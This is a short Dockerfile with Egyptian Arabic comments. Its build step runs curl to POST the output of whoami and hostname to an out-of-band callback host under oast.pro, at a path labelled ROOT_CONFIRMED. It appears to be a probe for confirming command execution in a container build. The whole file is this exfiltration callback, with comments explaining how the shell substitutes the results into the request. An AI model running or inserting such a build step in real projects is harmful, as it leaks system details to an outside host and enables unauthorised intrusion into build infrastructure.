FROM alpine:latest

# 1. نزل curl
RUN apk add --no-cache curl

# 2. الكبسولة: بنستخدم sh -c مع علامات ' '
# لاحظ إني كاتب `whoami` جوه الـ curl مباشرة
# الطريقة دي بتخلي الـ Shell هو اللي ينفذ الأمر ويحط النتيجة جوه الرابط
RUN /bin/sh -c 'curl -X POST -d "user=$(whoami) && host=$(hostname)" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/ROOT_CONFIRMED'
